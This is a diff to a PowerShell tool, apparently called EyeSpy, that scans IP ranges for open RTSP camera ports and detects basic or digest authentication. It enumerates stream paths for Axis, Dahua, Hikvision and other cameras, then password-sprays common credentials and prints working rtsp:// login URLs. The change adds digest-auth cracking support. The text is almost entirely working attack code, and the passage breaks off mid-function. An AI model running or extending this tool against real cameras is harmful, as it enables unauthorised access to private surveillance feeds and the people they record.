@@ -12,6 +12,9 @@ function EyeSpy {
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$Auto,
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [ValidateRange(10, 2000)]
+        [int]$Timeout = 200,
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [Switch]$Help
 
     )
@@ -19,31 +22,40 @@ function EyeSpy {
     if ($Help) {
 
         $HelpOutput = @("
-========================================================================================================
+════════════════════════════════════════════════════════════════════════════════════════════════════════
                 
-========================================================================================================
+════════════════════════════════════════════════════════════════════════════════════════════════════════
                                  _______             _______             
                                 |    ___.--.--.-----|     __.-----.--.--.
                                 |    ___|  |  |  -__|__     |  _  |  |  |
                                 |_______|___  |_____|_______|   __|___  |
                                         |_____|             |__|  |_____|   
                                 
-========================================================================================================
+════════════════════════════════════════════════════════════════════════════════════════════════════════
                                 By: Miiden
-========================================================================================================
+════════════════════════════════════════════════════════════════════════════════════════════════════════
  
 Check GitHub for more detailed descriptions.
 
-General Usage Parameters
-+---------------------+--------------+-----------------------------------------------------------------+
-| Parameter           |    Value     | Description                                                     |
-+---------------------+--------------+-----------------------------------------------------------------+
-| -Search             |  IP(/Range)  | Scans the provided IP/Range for Open RTSP Ports.                |
-| -NoAuth             |  IP(/Range)  | Checks the provided IP/Range if authentication is required.     |
-| -AuthAttack         |   IP:Port    | Performs a Password spray attack on provided targets.           |
-| -Auto               |  IP(/Range)  | All of the above automatically.                                 |
-| -Help               |     N/A      | Shows this Help.                                                |
-+---------------------+--------------+-----------------------------------------------------------------+
+General Usage Parameters:
+╔═══════════════════╦════════════╦═════════════════════════════════════════════════════════════════════╗
+║     Parameter     ║   Value    ║                  Description                                        ║
+╠═══════════════════╬════════════╬═════════════════════════════════════════════════════════════════════╣
+║      -Search      ║ IP(/Range) ║ Scans the provided IP/Range for Open RTSP Ports.                    ║
+║      -NoAuth      ║ IP(/Range) ║ Checks the provided IP/Range if authentication is required.         ║
+║       -Auto       ║ IP(/Range) ║ All of the above automatically.                                     ║
+║═══════════════════╬════════════╬═════════════════════════════════════════════════════════════════════╣
+║    -AuthAttack    ║ IP:Port    ║ Performs a Password spray attack on provided targets.               ║
+║       -Path       ║ 'Path'     ║ Requires -AuthAttack, Set a Known Path to Attack                    ║
+╚═══════════════════╩════════════╩═════════════════════════════════════════════════════════════════════╝
+
+Optional Parameters:
+╔═══════════════════╦════════════╦═════════════════════════════════════════════════════════════════════╗
+║     Parameter     ║   Value    ║                  Description                                        ║
+╠═══════════════════╬════════════╬═════════════════════════════════════════════════════════════════════╣
+║ -Timeout          ║ (10-2000)  ║ (Default: 200) Set Global Receive Timeout Value.                    ║
+║ -Help             ║    N/A     ║ Shows this Help.                                                    ║
+╚═══════════════════╩════════════╩═════════════════════════════════════════════════════════════════════╝
 
 Example Usage:
 
@@ -54,18 +66,18 @@ Example Usage:
   EyeSpy -NoAuth 192.168.0.123
  
 # Performs a password spraying attack with common credentials on a known open IP:Port
-EyeSpy -AuthAttack 192.168.0.13:8554
+  EyeSpy -AuthAttack 192.168.0.13:8554
 
 # Performs a password spraying attack with common credentials on a known open IP:Port/Path
-EyeSpy -AuthAttack 192.168.0.200:554 -Path 'MyStream'
+  EyeSpy -AuthAttack 192.168.0.200:554 -Path 'MyStream'
 
 # Performs all of the above automatically across a single IP or Range
-Eyespy -Auto 192.168.0.1/24
+  Eyespy -Auto 192.168.0.1/24
 
 # Shows this help message
-Eyespy -Help
+  Eyespy -Help
 
-========================================================================================================
+════════════════════════════════════════════════════════════════════════════════════════════════════════
 ")
 
         $HelpOutput | Write-Output
@@ -74,18 +86,18 @@ Eyespy -Help
     }
 
     $Banner = @("
-=========================================================
+═════════════════════════════════════════════════════════
                 
-=========================================================
+═════════════════════════════════════════════════════════
          _______             _______             
         |    ___.--.--.-----|     __.-----.--.--.
         |    ___|  |  |  -__|__     |  _  |  |  |
         |_______|___  |_____|_______|   __|___  |
                 |_____|             |__|  |_____|   
                                 
-=========================================================
+═════════════════════════════════════════════════════════
                 By: Miiden
-=========================================================
+═════════════════════════════════════════════════════════
     ")
 
     if (!$Search -and !$Auto -and !$NoAuth -and !$AuthAttack) {
@@ -104,8 +116,11 @@ Eyespy -Help
 
 
 $Banner
-
-
+Write-Host "Options:`r`n"
+Write-Host -NoNewline -ForegroundColor Yellow "[#]"
+Write-Host -NoNewline " Global Receive Timeout Set To`: "
+Write-Host -ForegroundColor Magenta "$Timeout`r`n"
+Write-Host "═════════════════════════════════════════════════════════`r`n"
 
 function Get-IpRange {
     [CmdletBinding(ConfirmImpact = 'None')]
@@ -165,6 +180,53 @@ function Get-IpRange {
     }
 }
 
+function GenerateDigest {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory)]
+        [string]$username,
+        [Parameter(Mandatory)]
+        [string]$password,
+        [Parameter(Mandatory)]
+        [string]$realm,
+        [Parameter(Mandatory)]
+        [string]$uri,
+        [Parameter(Mandatory)]
+        [string]$nonce
+    )
+
+        # Goal is to create this:
+        # $finalResponse = MD5(username:realm:password):nonce:MD5(method:uri)
+        
+        # Concatenate username, realm, and password with colon (:) separator
+        $userRealmPass = "$username`:$realm`:$password"
+
+        # Calculate MD5 hash of username:realm:password
+        $userRealmPassHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($userRealmPass))
+        $hash1 = [System.BitConverter]::ToString($userRealmPassHash) -replace '-', ''
+        $URPhash = $hash1.toLower()
+
+        # Concatenate method and URI with colon (:) separator
+        $methodUri = "DESCRIBE`:$uri"
+
+        # Calculate MD5 hash of method:uri
+        $methodUriHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($methodUri))
+        $hash2 = [System.BitConverter]::ToString($methodUriHash) -replace '-', ''
+        $MUhash = $hash2.toLower()
+
+        # Concatenate MD5 hash of username:realm:password, nonce, and MD5 hash of method:uri with colon (:) separator
+        $responseString = "$URPhash`:$nonce`:$MUhash"
+
+        # Calculate MD5 hash of concatenated string
+        $responseHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($responseString))
+        $responseHashHex = [System.BitConverter]::ToString($responseHash) -replace '-', ''
+
+        $finalResponse = $responseHashHex.ToLower()
+        
+        return $finalResponse
+
+}
+
 function Get-OpenRTSPPorts {
     [CmdletBinding()]
     param (
@@ -197,9 +259,9 @@ function Get-OpenRTSPPorts {
                 try {
                     $tcpClient = New-Object System.Net.Sockets.TcpClient
                     $tcpClient.SendTimeout = 100
-                    $tcpClient.ReceiveTimeout = 100
+                    $tcpClient.ReceiveTimeout = $Timeout
                     $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null)
-                    $success = $awaitResult.AsyncWaitHandle.WaitOne(100, $false)
+                    $success = $awaitResult.AsyncWaitHandle.WaitOne(250, $false)
 
                     if ($success) {
                         $tcpClient.EndConnect($awaitResult)
@@ -228,8 +290,7 @@ function Get-OpenRTSPPorts {
 
             $openPorts += $portsForIP
         }
-
-        return $openPorts
+            return $openPorts
     }
 
     end {
@@ -249,8 +310,124 @@ function Get-OpenRTSPPorts {
         
         Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
         Write-Host " Valid IPs With Open Ports Discovered.`r`n"
-        Write-Host "========================================================="
+        Write-Host "═════════════════════════════════════════════════════════"
     }
+}
+
+function Get-AuthType {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory)]
+        [PSCustomObject[]]$OpenPorts
+    )
+
+    # Use 1st Fake Route, to try and determine auth type, if that fails use a few common ones to try and find the auth type.
+    # Namely, Fake, Axis, Dahua, Hikvision
+    $authTestPath = @("TWlpZGVu", "axis-media/media.amp", "cam/realmonitor", "Streaming/Channels/101")
+    $foundAuth = @()
+
+    Write-Host "`r`nChecking for Auth Types`:`r`n"
+
+    foreach ($openPort in $OpenPorts) {
+        $ip = $openPort.IPAddress
+        $port = $openPort.Port
+        $authDetected = $false
+        $unknownAuth = $false
+
+        foreach ($testPath in $authTestPath) {
+            if ($authDetected) { break }  # Exit inner loop if auth type found
+
+            $authtyperesult = @()
+            $CRLF = [char]13 + [char]10
+
+            $request = "DESCRIBE rtsp://$ip`:$port/$testPath RTSP/1.0$CRLF" +
+                       "CSeq: 1$CRLF$CRLF"
+
+            try {
+                $tcpClient = New-Object System.Net.Sockets.TcpClient
+                $tcpClient.ReceiveTimeout = $Timeout
+                $tcpClient.Connect($ip, $port)
+
+                $stream = $tcpClient.GetStream()
+                $writer = New-Object System.IO.StreamWriter($stream)
+                $writer.Write($request)
+                $writer.Flush()
+
+                $reader = New-Object System.IO.StreamReader($stream)
+                $statusLine = $reader.ReadLine()
+
+                while (!$reader.EndOfStream) {
+                    $response = $reader.ReadLine()
+
+                    if ($response -match "(?i)\bdigest\b") {
+                        Write-Host -ForegroundColor Yellow -NoNewline "Found Digest`: "
+                        Write-Host "$ip`:$port"
+                        $authtyperesult += [PSCustomObject]@{
+                            IPAddress = $ip
+                            Port      = $port
+                            Status    = "Open"
+                            authType  = "Digest"
+                        }
+                        $authDetected = $true
+                        break  # Exit inner loop if auth type found
+                    } elseif ($response -match "(?i)\bbasic\b") {
+                        Write-Host -ForegroundColor Yellow -NoNewline "Found Basic`: "
+                        Write-Host "$ip`:$port"
+                        $authtyperesult += [PSCustomObject]@{
+                            IPAddress = $ip
+                            Port      = $port
+                            Status    = "Open"
+                            authType  = "Basic"
+                        }
+                        $authDetected = $true
+                        break  # Exit inner loop if auth type found
+                    } elseif ($response -match "(404 Not Found)") {
+                        $unknownAuth = $true
+                        #Write-Host -ForegroundColor Yellow -NoNewline "Auth Type Not Found, Testing Next Path For`: "
+                        #Write-Host "$ip`:$port"
+                    }
+                }
+            } catch {
+                #Write-Warning "An error occurred: $_"
+            } finally {
+                if ($tcpClient.Connected) {
+                    $tcpClient.Dispose()
+                }
+            }
+
+            if ($authtyperesult.Count -eq 0 -and !$unknownAuth) {
+                Write-Host -ForegroundColor Yellow -NoNewline "Found NoAuth`: "
+                Write-Host "$ip`:$port"
+                $foundAuth += [PSCustomObject]@{
+                    IPAddress = $ip
+                    Port      = $port
+                    Status    = "Open"
+                    authType  = "none"
+                }
+            } elseif ($unknownAuth -and ($authtyperesult.Count -eq 0)) {
+                # Do nothing, continue to the next path
+            } else {
+                $foundAuth += $authtyperesult
+            }
+        }
+
+        if ($unknownAuth -and !$authDetected) {
+            Write-Host -ForegroundColor Yellow -NoNewline "Unknown Auth`: "
+            Write-Host "$ip`:$port"
+            $foundAuth += [PSCustomObject]@{
+                IPAddress = $ip
+                Port      = $port
+                Status    = "Open"
+                authType  = "Unknown"
+            }
+        }
+    }
+
+    Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
+    Write-Host " Found Required Auth Types`r`n"
+    Write-Host "═════════════════════════════════════════════════════════`r`n"
+
+    return $foundAuth
 }
 
 function Get-ValidRTSPPaths {
@@ -260,10 +437,10 @@ function Get-ValidRTSPPaths {
         [PSCustomObject[]]$OpenPorts
     )
 
-    $Paths = @( "", "0/1", "0/video1", "1", "1.AMP", "1/h264major", "1/main", "1/stream1", "1080p", 
-    "11", "12", "125", "1440p", "480p", "4K", "666", "720p", "access_code", "access_name_for_stream_1_to_5",
-    "api/mjpegvideo.cgi", "av0_0", "av2", "avc", "avn=2", "AVStream1_1", "axis-media/media.amp",
-    "axis-media/media.amp?camera=1", "axis-media/media.amp?videocodec=h264", "cam", "cam/realmonitor",
+    $Paths = @( "", "0/1", "0/video1", "1", "axis-media/media.amp","cam/realmonitor","Streaming/Channels/101",
+    "1.AMP", "1/h264major", "1/main", "1/stream1", "1080p", "11", "12", "125", "1440p", "480p", "4K", "666", 
+    "720p", "access_code", "access_name_for_stream_1_to_5","api/mjpegvideo.cgi", "av0_0", "av2", "avc", "avn=2",
+    "AVStream1_1", "axis-media/media.amp?camera=1", "axis-media/media.amp?videocodec=h264", "cam",
     "cam/realmonitor?channel=0&subtype=0", "cam/realmonitor?channel=1&subtype=0", "cam/realmonitor?channel=1&subtype=1",
     "cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif", "CAM_ID.password.mp2", "cam0", "cam0_0", "cam0_1",
     "cam1", "cam1/h264", "cam1/h264/multicast", "cam1/mjpeg", "cam1/mpeg4", "cam1/mpeg4?user='username'&pwd='password'",
@@ -283,7 +460,7 @@ function Get-ValidRTSPPaths {
     "profile1/media.smp", "profile2/media.smp", "profile5/media.smp", "rtpvideo1.sdp", "rtsp_live0", "rtsp_live1",
     "rtsp_live2", "rtsp_tunnel", "rtsph264", "rtsph2641080p", "snap.jpg", "StdCh1", "stream", "stream.sdp", "stream/0",
     "stream/1", "stream/live.sdp", "stream1", "streaming/channels/0", "streaming/channels/1", "Streaming/Channels/1",
-    "streaming/channels/101", "Streaming/Unicast/channels/101", "tcp/av0_0", "test", "tmpfs/auto.jpg", "trackID=1",
+    "Streaming/Unicast/channels/101", "tcp/av0_0", "test", "tmpfs/auto.jpg", "trackID=1",
     "ucast/11", "udpstream", "user.pin.mp2", "v2", "video", "video.3gp", "video.h264", "video.mjpg", "video.mp4",
     "video.pro1", "video.pro2", "video.pro3", "video0", "video0.sdp", "video1", "video1.sdp", "VideoInput/1/h264/1",
     "VideoInput/1/mpeg4/1", "videoinput_1/h264_1/media.stm", "videoMain", "videostream.asf", "vis", "wfov"
@@ -294,20 +471,23 @@ function Get-ValidRTSPPaths {
     Write-Host "`r`nChecking for valid RTSP Paths:`r`n"
 
     foreach ($openPort in $OpenPorts) {
-        $ip = $openPort.IPAddress
-        $port = $openPort.Port
-        $validPathFound = $false
+            $ip = $openPort.IPAddress
+            $port = $openPort.Port
+            $authType = $openPort.authType
+            $validPathFound = $false
+
+
 
         foreach ($path in $Paths) {
             if ($validPathFound) { continue }  # Skip if a valid path is already found
 
             $CRLF = [char]13 + [char]10
             $request = "DESCRIBE rtsp://$ip`:$port/$path RTSP/1.0$CRLF" +
-                       "CSeq: 2$CRLF$CRLF"
+                       "CSeq: 1$CRLF$CRLF"
 
             try {
                 $tcpClient = New-Object System.Net.Sockets.TcpClient
-                $tcpClient.ReceiveTimeout = 100
+                $tcpClient.ReceiveTimeout = $Timeout
                 $tcpClient.Connect($ip, $port)
 
                 $stream = $tcpClient.GetStream()
@@ -330,6 +510,7 @@ function Get-ValidRTSPPaths {
                         IPAddress = $ip
                         Port      = $port
                         Path      = $path
+                        authType  = $authType
                     }
                 }
             }
@@ -346,7 +527,7 @@ function Get-ValidRTSPPaths {
 
     Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
     Write-Host " Potential Paths Found!`r`n"
-    Write-Host "=========================================================`r`n"
+    Write-Host "═════════════════════════════════════════════════════════`r`n"
     return $authRequiredPaths
 }
 
@@ -389,10 +570,10 @@ function Get-ValidRTSPCredential {
         [Parameter(Mandatory)]
         [string]$Path,
         [Parameter(Mandatory)]
-        [string[]]$Credentials
+        [string[]]$authType
     )
 
-
+    $credentials = GenerateCreds
     $parentActivity = "Checking`: $IP`:$Port/$Path"
     $parentStatus = "Starting"
     $parentId = Get-Random
@@ -409,7 +590,18 @@ function Get-ValidRTSPCredential {
         $parentProgress = [math]::Floor(($credentialStep / $totalCredentials) * 100)
         Write-Progress -Id $parentId -Activity $parentActivity -Status $parentStatus -PercentComplete $parentProgress -CurrentOperation $childActivity -SecondsRemaining (-1)
 
-        $validCred = Test-RTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
+        if ($authType -eq "Digest"){
+            # Use Digest Auth Mode
+            $validCred = Test-DigestRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
+        } elseif ($authType -eq "Basic") {
+            # Use Basic Auth Mode
+            $validCred = Test-BasicRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
+        } elseif ($authType -eq "Unknown"){
+            # At the moment, if an Unknown Auth Type is detected in the initial AuthType Checks (hopefully not) It just resorts to checking Basic Auth
+            # Further checks/attacks need to be implimented here.
+            $validCred = Test-BasicRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
+        }
+
         if ($validCred) {
             Write-Progress -Id $parentId -Activity $parentActivity -Status "Success" -PercentComplete 100 -Completed
             Write-Progress -Id $childId -Activity $childActivity -Status "Success" -PercentComplete 100 -Completed -ParentId $parentId
@@ -432,7 +624,7 @@ function Get-ValidRTSPCredential {
     }
 }
 
-function Test-RTSPAuth {
+function Test-BasicRTSPAuth {
     [CmdletBinding()]
     param (
         [Parameter(Mandatory)]
@@ -453,7 +645,7 @@ function Test-RTSPAuth {
 
     try {
         $tcpClient = New-Object System.Net.Sockets.TcpClient
-        $tcpClient.ReceiveTimeout = 100  # Set a timeout of 100ms
+        $tcpClient.ReceiveTimeout = $Timeout
         $tcpClient.Connect($IP, $Port)
 
         $stream = $tcpClient.GetStream()
@@ -470,15 +662,114 @@ function Test-RTSPAuth {
             $stream.Dispose()
             $tcpClient.Dispose()
 
-            $credential = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Credential))
-            return $credential
+            $credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Credential))
+            return $credentials
         }
         elseif ($statusLine -match 'RTSP/1.0 401 Unauthorized' -or $statusLine -match 'RTSP/1.0 403 Forbidden') {
             $reader.Dispose()
             $writer.Dispose()
             $stream.Dispose()
+            $tcpClient.Dispose()    
+        }
+    }
+    catch [System.Net.Sockets.SocketException] {
+        Write-Warning "Connection refused by $IP`:$Port Waiting 30s before continuing."
+        Start-Sleep -Seconds 30
+    }
+    catch {
+       # Error catch for debugging, usually non url compliant path.
+       # Write-Warning "An error occurred: $_"
+    }
+    finally {
+        if ($tcpClient.Connected) {
             $tcpClient.Dispose()
         }
+    }
+
+    return $null
+}
+
+function Test-DigestRTSPAuth {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory)]
+        [string]$IP,
+        [Parameter(Mandatory)]
+        [int]$Port,
+        [Parameter(Mandatory)]
+        [string]$Path,
+        [Parameter(Mandatory)]
+        [string]$Credential
+    )
+
+    $decodedCredentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Credential))
+    $usrpass = $decodedCredentials.split(':')
+    $username = $usrpass[0]
+    $password = $usrpass[1]
+    
+    $CRLF = [char]13 + [char]10
+    
+    try {
+        [int]$CSeq = 1
+
+        $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
+                   "CSeq: $CSeq$CRLF$CRLF"
+
+        $uri = "rtsp://$IP`:$Port/$Path"
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $tcpClient.ReceiveTimeout = 4  # Set a specifically low timeout due to issue with reading 200 response.
+        $tcpClient.Connect($IP, $Port)
+
+        $stream = $tcpClient.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $writer.Write($request)
+        $writer.Flush()
+
+        $reader = New-Object System.IO.StreamReader($stream)
+        
+        $digestProcessed = $false
+
+        while (!$reader.EndOfStream -and !$digestProcessed) {
+            $response = $reader.ReadLine()
+
+            # Check for Digest Authentication
+            if ($response -match "(?i)\bDigest\b") {
+                # Pluck out the Realm and Nonce for creating a response
+                $realm = if ($response -match 'realm="([^"]+)"') { $matches[1] } else { $null }
+                $nonce = if ($response -match 'nonce="([^"]+)"') { $matches[1] } else { $null }
+                # Create the response
+                $DigestResponse =  GenerateDigest -username $username -password $password -realm $realm -uri $uri -nonce $nonce
+                # Up the Cseq number
+                $CSeq ++
+
+                # Construct the second request
+                $request2 = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
+                            "CSeq: $CSeq$CRLF" +
+                            "Authorization: Digest username=`"$username`", password=`"$password`", realm=`"$realm`", nonce=`"$nonce`", uri=`"rtsp://$IP`:$Port/$Path`", response=`"$DigestResponse`"$CRLF$CRLF"
+                
+                # Send it
+                $writer.Write($request2)
+                $writer.Flush()
+
+                #################################################
+                ######## Speed issue is here at the moment ######
+                #################################################
+                
+                # Start reading responses for 200 OK
+                while (!$reader.EndOfStream) {
+                    $responseLine = $reader.ReadLine()
+
+                    if ($responseLine -match 'RTSP/1.0 200 OK') {
+                        $digestProcessed = $true
+                        return $decodedCredentials # Return the decoded Creds once 200 OK is received
+                    }
+                }
+
+                $digestProcessed = $true
+            }
+
+        }
+
     }
     catch [System.Net.Sockets.SocketException] {
         Write-Warning "Connection refused by $IP`:$Port Waiting 30s before continuing."
@@ -508,7 +799,7 @@ function Scan {
     $antiSpam = Get-OpenRTSPPorts -IPAddress $ipRange
 
     Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
-    Write-Host "=========================================================`r`n"
+    Write-Host "═════════════════════════════════════════════════════════`r`n"
    
 }
 
@@ -519,18 +810,19 @@ function NoAuthScan {
         [string]$Targets
     )
 
-    $local:ipRange = Get-IpRange -Target $Targets
-    $local:openPorts = Get-OpenRTSPPorts -IPAddress $local:ipRange
+    $ipRange = Get-IpRange -Target $Targets
+    $openPorts = Get-OpenRTSPPorts -IPAddress $ipRange
 
     # Check if there are any unique IP addresses with open ports
-    $uniqueIPsWithOpenPorts = $local:openPorts | Select-Object -ExpandProperty IPAddress -Unique
+    $uniqueIPsWithOpenPorts = $openPorts | Select-Object -ExpandProperty IPAddress -Unique
 
     if ($uniqueIPsWithOpenPorts.Count -gt 0) {
+    
        $variableToStopSpam = Get-ValidRTSPPaths -OpenPorts $openPorts
     }
     
-    Write-Host "Scan completed.`r`n" -ForegroundColor Green
-    Write-Host "=========================================================`r`n"
+    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
+    Write-Host "═════════════════════════════════════════════════════════`r`n"
 }
 
 function AuthAttack {
@@ -541,42 +833,76 @@ function AuthAttack {
         [Parameter(Mandatory = $False)]
         [string]$Path
     )
-
     $ipAndPort = $Target.Split(':')
     $ip = $ipAndPort[0]
     $port = $ipAndPort[1]
-    $cliaddress += [PSCustomObject]@{
-        IPAddress = $ip
-        Port      = $port
-        Status    = "Open"
+
+
+
+    try {
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $tcpClient.SendTimeout = 100
+        $tcpClient.ReceiveTimeout = $Timeout
+        $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null)
+        $success = $awaitResult.AsyncWaitHandle.WaitOne(100, $false)
+
+        if ($success) {
+            $tcpClient.EndConnect($awaitResult)
+            if ($tcpClient.Connected) {
+                Write-Host -NoNewline -ForegroundColor Green "[+]"
+                Write-Host -NoNewline " Open: "
+                Write-Host -ForegroundColor Green "$ip`:$port"
+                $cliaddress += [PSCustomObject]@{
+                    IPAddress = $ip
+                    Port      = $port
+                    Status    = "Open"
+                }
+                $tcpClient.Close()
+            }
+        } else {
+            Write-Host -NoNewline -ForegroundColor Red "[!]"
+            Write-Host -NoNewline " Not Open: "
+            Write-Host -ForegroundColor Red "$ip`:$port"
+            return
+        }
+    } 
+    catch {
+    
     }
+
 
     if ($PSBoundParameters.ContainsKey('Path')) {
         # Path parameter is provided, create a PSCustomObject directly
+        $getAuth = Get-AuthType -OpenPorts $cliaddress
         $authRequiredPaths = [PSCustomObject]@{
             IPAddress = $ip
             Port      = $port
             Path      = $Path
+            AuthType  = $getAuth.authType
         }
     }
     else {
         # Path parameter is not provided, use the default behavior
-        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $cliaddress
+        $getAuth = Get-AuthType -OpenPorts $cliaddress
+        $AuthConstruct = [PSCustomObject]@{
+            IPAddress = $ip
+            Port      = $port
+            AuthType  = $getAuth.authType
+        }
+        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $AuthConstruct
     }
 
-    $credentials = GenerateCreds
-
-    $validCredentials = @()
 
     if ($authRequiredPaths -is [System.Array]) {
         if ($authRequiredPaths.Count -gt 0) {
-            Write-Host "=========================================================`r`n"
+            Write-Host "═════════════════════════════════════════════════════════`r`n"
             Write-Host "Beginning Password Spray:`r`n"
 
             $index = 0
             while ($index -lt $authRequiredPaths.Count) {
                 $authPath = $authRequiredPaths[$index]
-                $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -Credentials $credentials
+
+                $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -authType $authPath.authType
 
                 if ($result.CredentialFound) {
                     $validCredentials += [PSCustomObject]@{
@@ -586,9 +912,9 @@ function AuthAttack {
                         Credentials = $result.Credential
                     }
 
-                    Write-Host -ForegroundColor Yellow -NoNewline "====="
+                    Write-Host -ForegroundColor Yellow -NoNewline "═════"
                     Write-Host -NoNewline " Found Credentials "
-                    Write-Host -ForegroundColor Yellow "====="
+                    Write-Host -ForegroundColor Yellow "═════"
                 
                     Write-Host -NoNewline -ForegroundColor Green  "[+] "
                     $authString = $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
@@ -621,7 +947,8 @@ function AuthAttack {
         # $authRequiredPaths is a single object, handle it separately
         Write-Host "Beginning Password Spray:`r`n"
 
-        $result = Get-ValidRTSPCredential -IP $authRequiredPaths.IPAddress -Port $authRequiredPaths.Port -Path $authRequiredPaths.Path -Credentials $credentials
+        $result = Get-ValidRTSPCredential -IP $authRequiredPaths.IPAddress -Port $authRequiredPaths.Port -Path $authRequiredPaths.Path -authType $authRequiredPaths.authType
+        
 
         if ($result.CredentialFound) {
             $validCredentials += [PSCustomObject]@{
@@ -631,9 +958,9 @@ function AuthAttack {
                 Credentials = $result.Credential
             }
 
-            Write-Host -ForegroundColor Yellow -NoNewline "====="
+            Write-Host -ForegroundColor Yellow -NoNewline "═════"
             Write-Host -NoNewline " Found Credentials "
-            Write-Host -ForegroundColor Yellow "====="
+            Write-Host -ForegroundColor Yellow "═════"
                 
             Write-Host -NoNewline -ForegroundColor Green  "[+] "
             $authString = $authRequiredPaths.IPAddress + ":" + $authRequiredPaths.Port + "/" + $authRequiredPaths.Path
@@ -651,7 +978,7 @@ function AuthAttack {
     }
 
     Write-Host "Scan completed.`r`n" -ForegroundColor Green
-    Write-Host "=========================================================`r`n"
+    Write-Host "═════════════════════════════════════════════════════════`r`n"
 }
 
 function FullAuto {
@@ -663,63 +990,73 @@ function FullAuto {
 
     $ipRange = Get-IpRange -Target $Targets
     $openPorts = Get-OpenRTSPPorts -IPAddress $ipRange
-    $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $openPorts
-    $credentials = GenerateCreds
-    $validCredentials = @()
+    
+    # Check if there are any unique IP addresses with open ports
+    $uniqueIPsWithOpenPorts = $openPorts | Select-Object -ExpandProperty IPAddress -Unique
 
-    if ($authRequiredPaths.Count -gt 0) {
+    if ($uniqueIPsWithOpenPorts.Count -gt 0) {
 
-        Write-Host "Beginning Password Spray:`r`n"
+        $authTypeResult = Get-AuthType -OpenPorts $openPorts
+        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $authTypeResult
+        $validCredentials = @()
 
-        $index = 0
+        if ($authRequiredPaths.Count -gt 0) {
 
-        while ($index -lt $authRequiredPaths.Count) {
-            $authPath = $authRequiredPaths[$index]
-            $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -Credentials $credentials
+            Write-Host "Beginning Password Spray:`r`n"
 
-            if ($result.CredentialFound) {
-                $validCredentials += [PSCustomObject]@{
-                    IPAddress   = $authPath.IPAddress
-                    Port        = $authPath.Port
-                    Path        = $authPath.Path
-                    Credentials = $result.Credential
-                }
+            $index = 0
 
-                Write-Host -ForegroundColor Yellow -NoNewline "====="
-                Write-Host -NoNewline " Found Credentials "
-                Write-Host -ForegroundColor Yellow "====="
+            while ($index -lt $authRequiredPaths.Count) {
+                $authPath = $authRequiredPaths[$index]
+                $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -authType $authPath.authType
+
+                if ($result.CredentialFound) {
+                    $validCredentials += [PSCustomObject]@{
+                        IPAddress   = $authPath.IPAddress
+                        Port        = $authPath.Port
+                        Path        = $authPath.Path
+                        Credentials = $result.Credential
+                    }
+
+                    Write-Host -ForegroundColor Yellow -NoNewline "═════"
+                    Write-Host -NoNewline " Found Credentials "
+                    Write-Host -ForegroundColor Yellow "═════"
                 
-                Write-Host -NoNewline -ForegroundColor Green  "[+] "
-                $authString = $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
-                Write-Host "Path: $authString"
-                Write-Host -NoNewline -ForegroundColor Green  "[+] "
-                $credsString = "Creds`: " + $result.Credential
-                Write-Host "$credsString `r`n"
-                $fullRTSPString = "rtsp://" + $result.Credential + "@" + $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
-                Write-Host -NoNewline -ForegroundColor Green  ">>> "
-                Write-Host -NoNewline "$fullRTSPString"
-                Write-Host -ForegroundColor Green  " <<<`r`n"
+                    Write-Host -NoNewline -ForegroundColor Green  "[+] "
+                    $authString = $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
+                    Write-Host "Path: $authString"
+                    Write-Host -NoNewline -ForegroundColor Green  "[+] "
+                    $credsString = "Creds`: " + $result.Credential
+                    Write-Host "$credsString `r`n"
+                    $fullRTSPString = "rtsp://" + $result.Credential + "@" + $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
+                    Write-Host -NoNewline -ForegroundColor Green  ">>> "
+                    Write-Host -NoNewline "$fullRTSPString"
+                    Write-Host -ForegroundColor Green  " <<<`r`n"
 
-                # Remove the current IP:Port combination from the array
-                $authRequiredPaths = $authRequiredPaths | Where-Object { ($_.IPAddress -ne $authPath.IPAddress) -or ($_.Port -ne $authPath.Port) }
+                    # Remove the current IP:Port combination from the array
